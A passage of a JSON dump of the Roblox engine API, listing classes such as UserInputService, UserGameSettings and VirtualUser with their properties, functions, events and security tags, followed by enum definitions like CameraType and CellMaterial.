t":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Warn","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Run","tags":["PluginSecurity"],"Class":"TestService","type":"YieldFunction"},{"Arguments":[{"Name":"condition","Type":"bool"},{"Name":"text","Type":"string"},{"Name":"script","Type":"Instance"},{"Name":"line","Type":"int"}],"Name":"ServerCollectConditionalResult","tags":[],"Class":"TestService","type":"Event"},{"Arguments":[{"Name":"text","Type":"string"},{"Name":"script","Type":"Instance"},{"Name":"line","Type":"int"}],"Name":"ServerCollectResult","tags":[],"Class":"TestService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"TextService","tags":["notCreatable"]},{"ReturnType":"Vector2","Arguments":[{"Type":"string","Name":"string","Default":null},{"Type":"int","Name":"fontSize","Default":null},{"Type":"Font","Name":"font","Default":null},{"Type":"Vector2","Name":"frameSize","Default":null}],"Name":"GetTextSize","tags":["RobloxScriptSecurity"],"Class":"TextService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TimerService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Toolbar","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"string","Name":"tooltip","Default":null},{"Type":"string","Name":"iconname","Default":null}],"Name":"CreateButton","tags":["PluginSecurity"],"Class":"Toolbar","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TouchInputService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"TouchTransmitter","tags":["notCreatable","notbrowsable"]},{"Superclass":"Instance","type":"Class","Name":"TweenService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"UserGameSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllTutorialsDisabled","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"CustomCameraMode","type":"Property","Name":"CameraMode","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"ComputerCameraMovementMode","type":"Property","Name":"ComputerCameraMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"ComputerMovementMode","type":"Property","Name":"ComputerMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"ControlMode","type":"Property","Name":"ControlMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"Fullscreen","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"UploadSetting","type":"Property","Name":"ImageUploadPromptBehavior","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"float","type":"Property","Name":"MasterVolume","tags":[],"Class":"UserGameSettings"},{"ValueType":"float","type":"Property","Name":"MouseSensitivity","tags":[],"Class":"UserGameSettings"},{"ValueType":"RotationType","type":"Property","Name":"RotationType","tags":[],"Class":"UserGameSettings"},{"ValueType":"SavedQualitySetting","type":"Property","Name":"SavedQualityLevel","tags":[],"Class":"UserGameSettings"},{"ValueType":"TouchCameraMovementMode","type":"Property","Name":"TouchCameraMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"TouchMovementMode","type":"Property","Name":"TouchMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"UsedHideHudShortcut","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"int","type":"Property","Name":"VRRotationIntensity","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"UploadSetting","type":"Property","Name":"VideoUploadPromptBehavior","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"tutorialId","Default":null}],"Name":"GetTutorialState","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"InFullScreen","tags":[],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"InStudioMode","tags":[],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"tutorialId","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"SetTutorialState","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings","type":"Function"},{"Arguments":[{"Name":"isFullscreen","Type":"bool"}],"Name":"FullscreenChanged","tags":[],"Class":"UserGameSettings","type":"Event"},{"Arguments":[{"Name":"isStudioMode","Type":"bool"}],"Name":"StudioModeChanged","tags":[],"Class":"UserGameSettings","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"UserInputService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AccelerometerEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"GamepadEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"GyroscopeEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"KeyboardEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"ModalEnabled","tags":[],"Class":"UserInputService"},{"ValueType":"MouseBehavior","type":"Property","Name":"MouseBehavior","tags":[],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"MouseEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"MouseIconEnabled","tags":[],"Class":"UserInputService"},{"ValueType":"OverrideMouseIconBehavior","type":"Property","Name":"OverrideMouseIconBehavior","tags":["RobloxScriptSecurity"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"TouchEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"CoordinateFrame","type":"Property","Name":"UserHeadCFrame","tags":["deprecated","readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"VREnabled","tags":["readonly"],"Class":"UserInputService"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null},{"Type":"KeyCode","Name":"gamepadKeyCode","Default":null}],"Name":"GamepadSupports","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetConnectedGamepads","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeviceAcceleration","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeviceGravity","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetDeviceRotation","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetFocusedTextBox","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetGamepadConnected","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetGamepadState","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetKeysPressed","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"UserInputType","Arguments":[],"Name":"GetLastInputType","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetNavigationGamepads","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Platform","Arguments":[],"Name":"GetPlatform","tags":["RobloxScriptSecurity"],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetSupportedGamepadKeyCodes","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[{"Type":"UserCFrame","Name":"type","Default":null}],"Name":"GetUserCFrame","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"KeyCode","Name":"keyCode","Default":null}],"Name":"IsKeyDown","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadEnum","Default":null}],"Name":"IsNavigationGamepad","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RecenterUserHeadCFrame","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"gamepadEnum","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetNavigationGamepad","tags":[],"Class":"UserInputService","type":"Function"},{"Arguments":[{"Name":"acceleration","Type":"Instance"}],"Name":"DeviceAccelerationChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gravity","Type":"Instance"}],"Name":"DeviceGravityChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"rotation","Type":"Instance"},{"Name":"cframe","Type":"CoordinateFrame"}],"Name":"DeviceRotationChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gamepadNum","Type":"UserInputType"}],"Name":"GamepadConnected","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gamepadNum","Type":"UserInputType"}],"Name":"GamepadDisconnected","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputBegan","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputEnded","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"JumpRequest","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"lastInputType","Type":"UserInputType"}],"Name":"LastInputTypeChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"textboxReleased","Type":"Instance"}],"Name":"TextBoxFocusReleased","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"textboxFocused","Type":"Instance"}],"Name":"TextBoxFocused","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchEnded","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchLongPress","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchMoved","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"totalTranslation","Type":"Vector2"},{"Name":"velocity","Type":"Vector2"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchPan","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"scale","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchPinch","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"rotation","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchRotate","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchStarted","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"swipeDirection","Type":"SwipeDirection"},{"Name":"numberOfTouches","Type":"int"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchSwipe","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchTap","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"type","Type":"UserCFrame"},{"Name":"value","Type":"CoordinateFrame"}],"Name":"UserCFrameChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"WindowFocusReleased","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"WindowFocused","tags":[],"Class":"UserInputService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Vector3Value","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Value","tags":[],"Class":"Vector3Value"},{"Arguments":[{"Name":"value","Type":"Vector3"}],"Name":"Changed","tags":[],"Class":"Vector3Value","type":"Event"},{"Arguments":[{"Name":"value","Type":"Vector3"}],"Name":"changed","tags":["deprecated"],"Class":"Vector3Value","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"VirtualUser","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button1Down","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button1Up","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button2Down","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button2Up","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"CaptureController","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"ClickButton1","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"ClickButton2","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"MoveMouse","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"SetKeyDown","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"SetKeyUp","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StartRecording","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"StopRecording","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"TypeKey","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Visit","tags":["notCreatable"]},{"ReturnType":"string","Arguments":[],"Name":"GetUploadUrl","tags":["RobloxSecurity"],"Class":"Visit","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"pingUrl","Default":null},{"Type":"int","Name":"interval","Default":null}],"Name":"SetPing","tags":["RobloxSecurity"],"Class":"Visit","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetUploadUrl","tags":["RobloxSecurity"],"Class":"Visit","type":"Function"},{"type":"Enum","Name":"AASamples","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":1,"Enum":"AASamples"},{"type":"EnumItem","Name":"4","tags":[],"Value":4,"Enum":"AASamples"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"AASamples"},{"type":"Enum","Name":"AccessType","tags":[]},{"type":"EnumItem","Name":"Me","tags":[],"Value":0,"Enum":"AccessType"},{"type":"EnumItem","Name":"Friends","tags":[],"Value":1,"Enum":"AccessType"},{"type":"EnumItem","Name":"Everyone","tags":[],"Value":2,"Enum":"AccessType"},{"type":"EnumItem","Name":"InviteOnly","tags":[],"Value":3,"Enum":"AccessType"},{"type":"Enum","Name":"ActionType","tags":[]},{"type":"EnumItem","Name":"Nothing","tags":[],"Value":0,"Enum":"ActionType"},{"type":"EnumItem","Name":"Pause","tags":[],"Value":1,"Enum":"ActionType"},{"type":"EnumItem","Name":"Lose","tags":[],"Value":2,"Enum":"ActionType"},{"type":"EnumItem","Name":"Draw","tags":[],"Value":3,"Enum":"ActionType"},{"type":"EnumItem","Name":"Win","tags":[],"Value":4,"Enum":"ActionType"},{"type":"Enum","Name":"ActuatorType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"ActuatorType"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":1,"Enum":"ActuatorType"},{"type":"EnumItem","Name":"Servo","tags":[],"Value":2,"Enum":"ActuatorType"},{"type":"Enum","Name":"AnimationPriority","tags":[]},{"type":"EnumItem","Name":"Idle","tags":[],"Value":0,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Movement","tags":[],"Value":1,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Action","tags":[],"Value":2,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Core","tags":[],"Value":1000,"Enum":"AnimationPriority"},{"type":"Enum","Name":"Antialiasing","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"Antialiasing"},{"type":"EnumItem","Name":"Off","tags":[],"Value":2,"Enum":"Antialiasing"},{"type":"EnumItem","Name":"On","tags":[],"Value":1,"Enum":"Antialiasing"},{"type":"Enum","Name":"Axis","tags":[]},{"type":"EnumItem","Name":"X","tags":[],"Value":0,"Enum":"Axis"},{"type":"EnumItem","Name":"Y","tags":[],"Value":1,"Enum":"Axis"},{"type":"EnumItem","Name":"Z","tags":[],"Value":2,"Enum":"Axis"},{"type":"Enum","Name":"BinType","tags":[]},{"type":"EnumItem","Name":"Script","tags":[],"Value":0,"Enum":"BinType"},{"type":"EnumItem","Name":"GameTool","tags":[],"Value":1,"Enum":"BinType"},{"type":"EnumItem","Name":"Grab","tags":[],"Value":2,"Enum":"BinType"},{"type":"EnumItem","Name":"Clone","tags":[],"Value":3,"Enum":"BinType"},{"type":"EnumItem","Name":"Hammer","tags":[],"Value":4,"Enum":"BinType"},{"type":"Enum","Name":"BodyPart","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"BodyPart"},{"type":"EnumItem","Name":"Torso","tags":[],"Value":1,"Enum":"BodyPart"},{"type":"EnumItem","Name":"LeftArm","tags":[],"Value":2,"Enum":"BodyPart"},{"type":"EnumItem","Name":"RightArm","tags":[],"Value":3,"Enum":"BodyPart"},{"type":"EnumItem","Name":"LeftLeg","tags":[],"Value":4,"Enum":"BodyPart"},{"type":"EnumItem","Name":"RightLeg","tags":[],"Value":5,"Enum":"BodyPart"},{"type":"Enum","Name":"Button","tags":[]},{"type":"EnumItem","Name":"Jump","tags":[],"Value":32,"Enum":"Button"},{"type":"EnumItem","Name":"Dismount","tags":[],"Value":8,"Enum":"Button"},{"type":"Enum","Name":"ButtonStyle","tags":[]},{"type":"EnumItem","Name":"Custom","tags":[],"Value":0,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxButtonDefault","tags":[],"Value":1,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxButton","tags":[],"Value":2,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundButton","tags":[],"Value":3,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundDefaultButton","tags":[],"Value":4,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundDropdownButton","tags":[],"Value":5,"Enum":"ButtonStyle"},{"type":"Enum","Name":"CameraMode","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"CameraMode"},{"type":"EnumItem","Name":"LockFirstPerson","tags":[],"Value":1,"Enum":"CameraMode"},{"type":"Enum","Name":"CameraPanMode","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"CameraPanMode"},{"type":"EnumItem","Name":"EdgeBump","tags":[],"Value":1,"Enum":"CameraPanMode"},{"type":"Enum","Name":"CameraType","tags":[]},{"type":"EnumItem","Name":"Fixed","tags":[],"Value":0,"Enum":"CameraType"},{"type":"EnumItem","Name":"Watch","tags":[],"Value":2,"Enum":"CameraType"},{"type":"EnumItem","Name":"Attach","tags":[],"Value":1,"Enum":"CameraType"},{"type":"EnumItem","Name":"Track","tags":[],"Value":3,"Enum":"CameraType"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":4,"Enum":"CameraType"},{"type":"EnumItem","Name":"Custom","tags":[],"Value":5,"Enum":"CameraType"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":6,"Enum":"CameraType"},{"type":"Enum","Name":"CellBlock","tags":[]},{"type":"EnumItem","Name":"Solid","tags":[],"Value":0,"Enum":"CellBlock"},{"type":"EnumItem","Name":"VerticalWedge","tags":[],"Value":1,"Enum":"CellBlock"},{"type":"EnumItem","Name":"CornerWedge","tags":[],"Value":2,"Enum":"CellBlock"},{"type":"EnumItem","Name":"InverseCornerWedge","tags":[],"Value":3,"Enum":"CellBlock"},{"type":"EnumItem","Name":"HorizontalWedge","tags":[],"Value":4,"Enum":"CellBlock"},{"type":"Enum","Name":"CellMaterial","tags":[]},{"type":"EnumItem","Name":"Empty","tags":[],"Value":0,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Grass","tags":[],"Value":1,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Sand","tags":[],"Value":2,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":3,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Granite","tags":[],"Value":4,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Asphalt","tags":[],"Value":5,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Iron","tags":[],"Value":6,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Aluminum","tags":[],"Value":7,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Gold","tags":[],"Value":8,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"WoodPlank","tags":[],"Value":9,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"WoodLog","tags":[],"Value":10,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Gravel","tags":[],"Value":11,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"CinderBlock","tags":[],"Value":12,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"MossyStone","tags":[],"Value":13,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Cement","tags":[],"Value":14,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"RedPlastic","tags":[],"Value":15,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"BluePlastic","tags":[],"Value":16,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Water","tags":[],"Value":17,"Enum":"CellMaterial"},{"type":"Enum","Name":"CellOrientation","tags":[]},{"type":"EnumItem","Name":"NegZ","tags":[],"Value":0,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"X","tags":[],"Value":1,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"Z","tags":[],"Value":2,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"NegX","tags":[],"Value":3,"Enum":"CellOrientation"},{"type":"Enum","Name":"CenterDialogType","tags":[]},{"type":"EnumItem","Name":"UnsolicitedDialog","tags":[],"Value":1,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"PlayerInitiatedDialog","tags":[],"Value":2,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"ModalDialog","tags":[],"Value":3,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"QuitDialog","tags":[],"Value":4,"Enum":"CenterDialogType"},{"type":"Enum","Name":"ChatColor","tags":[]},{"type":"EnumItem","Name":"Blue","tags":[],"Value":0,"Enum":"ChatColor"},{"type":"EnumItem","Name":"Green","tags":[],"Value":1,"Enum":"ChatColor"},{"type":"EnumItem","Name":"Red","tags":[],"Value":2,"Enum":"ChatColor"},{"type":"Enum","Name":"ChatMode","tags":[]},{"type":"EnumItem","Name":"Menu","tags":[],"Value":0,"Enum":"ChatMode"},{"type":"EnumItem","Name":"TextAndMenu","tags":[],"Value":1,"Enum":"ChatMode"},{"type":"Enum","Name":"ChatStyle","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"ChatStyle"},{"type":"EnumItem","Name":"Bubble","tags":[],"Value":1,"Enum":"ChatStyle"},{"type":"EnumItem","Name":"ClassicAndBubble","tags":[],"Value":2,"Enum":"ChatStyle"},{"type":"Enum","Name":"CollisionFidelity","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CollisionFidelity"},{"type":"EnumItem","Name":"Hull","tags":[],"Value":1,"Enum":"CollisionFidelity"},{"type":"EnumItem","Name":"Box","tags":[],"Value":2,"Enum":"CollisionFidelity"},{"type":"Enum","Name":"ComputerCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ComputerCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"ComputerCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"ComputerCameraMovementMode"},{"type":"Enum","Name":"ComputerMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ComputerMovementMode"},{"type":"EnumItem","Name":"KeyboardMouse","tags":[],"Value":1,"Enum":"ComputerMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":2,"Enum":"ComputerMovementMode"},{"type":"Enum","Name":"ConcurrencyModel","tags":[]},{"type":"EnumItem","Name":"Serial","tags":[],"Value":0,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Safe","tags":[],"Value":1,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Logical","tags":[],"Value":2,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Empirical","tags":[],"Value":3,"Enum":"ConcurrencyModel"},{"type":"Enum","Name":"ControlMode","tags":[]},{"type":"EnumItem","Name":"MouseLockSwitch","tags":[],"Value":1,"Enum":"ControlMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"ControlMode"},{"type":"Enum","Name":"CoreGuiType","tags":[]},{"type":"EnumItem","Name":"PlayerList","tags":[],"Value":0,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Health","tags":[],"Value":1,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Backpack","tags":[],"Value":2,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Chat","tags":[],"Value":3,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"All","tags":[],"Value":4,"Enum":"CoreGuiType"},{"type":"Enum","Name":"CreatorType","tags":[]},{"type":"EnumItem","Name":"User","tags":[],"Value":0,"Enum":"CreatorType"},{"type":"EnumItem","Name":"Group","tags":[],"Value":1,"Enum":"CreatorType"},{"type":"Enum","Name":"CurrencyType","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CurrencyType"},{"type":"EnumItem","Name":"Robux","tags":[],"Value":1,"Enum":"CurrencyType"},{"type":"EnumItem","Name":"Tix","tags":[],"Value":2,"Enum":"CurrencyType"},{"type":"Enum","Name":"CustomCameraMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CustomCameraMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"CustomCameraMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"CustomCameraMode"},{"type":"Enum","Name":"DevCameraOcclusionMode","tags":[]},{"type":"EnumItem","Name":"Zoom","tags":[],"Value":0,"Enum":"DevCameraOcclusionMode"},{"type":"EnumItem","Name":"Invisicam","tags":[],"Value":1,"Enum":"DevCameraOcclusionMode"},{"type":"Enum","Name":"DevComputerCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevComputerCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"DevComputerCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"DevComputerCameraMovementMode"},{"type":"Enum","Name":"DevComputerMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"KeyboardMouse","tags":[],"Value":1,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":2,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":3,"Enum":"DevComputerMovementMode"},{"type":"Enum","Name":"DevTouchCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevTouchCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"